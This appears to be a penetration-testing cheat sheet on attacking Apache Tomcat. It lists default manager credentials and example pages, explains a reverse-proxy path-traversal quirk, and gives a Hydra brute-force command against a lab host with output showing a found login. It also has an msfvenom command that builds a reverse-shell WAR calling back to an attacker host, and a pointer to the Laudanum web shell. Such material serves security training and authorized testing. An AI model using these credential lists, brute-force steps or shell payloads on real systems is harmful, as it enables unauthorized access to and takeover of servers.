---
description: Attacking Tomcat Service
---

# Tomcat

### Default Credentials

{% code overflow="wrap" %}
```
admin:password
admin:
admin:Password1
admin:password1
admin:admin
admin:tomcat
both:tomcat
manager:manager
role1:role1
role1:tomcat
role:changethis
root:Password1
root:changethis
root:password
root:password1
root:r00t
root:root
root:toor
tomcat:tomcat
tomcat:s3cret
tomcat:password1
tomcat:password
tomcat:
tomcat:admin
tomcat:changethis
```
{% endcode %}

### Default Pages

* /examples/jsp/num/numguess.jsp&#x20;
* /examples/jsp/dates/date.jsp&#x20;
* /examples/jsp/snp/snoop.jsp&#x20;
* /examples/jsp/error/error.html&#x20;
* /examples/jsp/sessions/carts.html&#x20;
* /examples/jsp/checkbox/check.html&#x20;
* /examples/jsp/colors/colors.html&#x20;
* /examples/jsp/cal/login.html&#x20;
* /examples/jsp/include/include.jsp&#x20;
* /examples/jsp/forward/forward.jsp&#x20;
* /examples/jsp/plugin/plugin.jsp&#x20;
* /examples/jsp/jsptoserv/jsptoservlet.jsp&#x20;
* /examples/jsp/simpletag/foo.jsp&#x20;
* /examples/jsp/mail/sendmail.jsp&#x20;
* /examples/servlet/HelloWorldExample&#x20;
* /examples/servlet/RequestInfoExample&#x20;
* /examples/servlet/RequestHeaderExample&#x20;
* /examples/servlet/RequestParamExample&#x20;
* /examples/servlet/CookieExample&#x20;
* /examples/servlet/JndiServlet&#x20;
* /examples/servlet/SessionExample&#x20;
* /tomcat-docs/appdev/sample/web/hello.jsp&#x20;
* /docs

### Tomcat Path Traversal

Web servers and reverse proxies normalize the request path. For example, the path **/image/../image/** is normalized to **/images/**. When Apache Tomcat is used together with a reverse proxy such as nginx there is a nromalization inconsistency.\
\
Tomcat will threat the sequence **/..;/** as **/../** and normalize the path while reverse proxies will not normalize this sequence and send it to Apache Tomcat as it is.\
\
This allows an attacker to access Apache Tomcat resources that are not normally accessible via the reverse proxy mapping.

Reference:

* [https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/)

### Brute Force Attack

{% code overflow="wrap" %}
```bash
hydra -L users.txt -P passwords.txt -f 172.16.8.148 -s 8080 http-get /manager/
```
{% endcode %}

Example output:

```bash
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-06 21:36:01
[DATA] max 16 tasks per 1 server, overall 16 tasks, 20 login tries (l:4/p:5), ~2 tries per task
[DATA] attacking http-get://172.16.8.148:8080/manager/
[8080][http-get] host: 172.16.8.148   login: admin   password: admin
[STATUS] attack finished for 172.16.8.148 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-06 21:36:02
```

And then, login into Tomcat Manager.

<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhvZKD1qweQw89MqrzEJ1e1J1tcJ3rWizWLCWZzzGYVlMxy__d-6_HhXmrzFqndxwt0rORQ5nYFYRNppkcfjSzXmgwJMlDXGwUOnz8oE3myyUtQTagJQhbq6MiAv0MVQ6bWZrCbdxS7k8SMQqdNOT6SKnmT7qXnpfbMMP4XXEeAOK3zO04IWxl-Qgb2raw/s1000/tomcat-manager.png" alt=""><figcaption><p>Tomcat Manager</p></figcaption></figure>

### Backdooring Tomcat Manager

{% code overflow="wrap" %}
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.8.1 LPORT=4448 -f war -o revshell.war
```
{% endcode %}

Or use Laudanum cmd.war shell at **/usr/share/laudanum/jsp**.

{% code overflow="wrap" %}
```bash
➜  jsp tree
.
├── cmd.war
├── makewar.sh
└── warfiles
    ├── cmd.jsp
    ├── META-INF
    │   └── MANIFEST.MF
    └── WEB-INF
        └── web.xml

4 directories, 5 files
```
{% endcode %}

Example of Laudanum WAR Shell

<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjw11cCHRkpxpt-Mrl8AEsmzZcRDa75MDV2X9EmAUXHAhqOuFMRFHyy_DNK3P88bCHD9raqARpGVbUGr2qknCKOjdb-lKfw8RKW9VhG32s3ekVBK3VZ79NQqQdnOnooaOO0K129Ueoq99t2DkQ2Q9d_cpD9FFIR5lupJ0H1z2GdNPXBTIoiOAs4jzpInUg/s1000/tomcat-mgr-rce.png" alt=""><figcaption><p>CMD Shell</p></figcaption></figure>

### Other Tools

* [https://github.com/p0dalirius/ApacheTomcatScanner](https://github.com/p0dalirius/ApacheTomcatScanner)

Update soon....
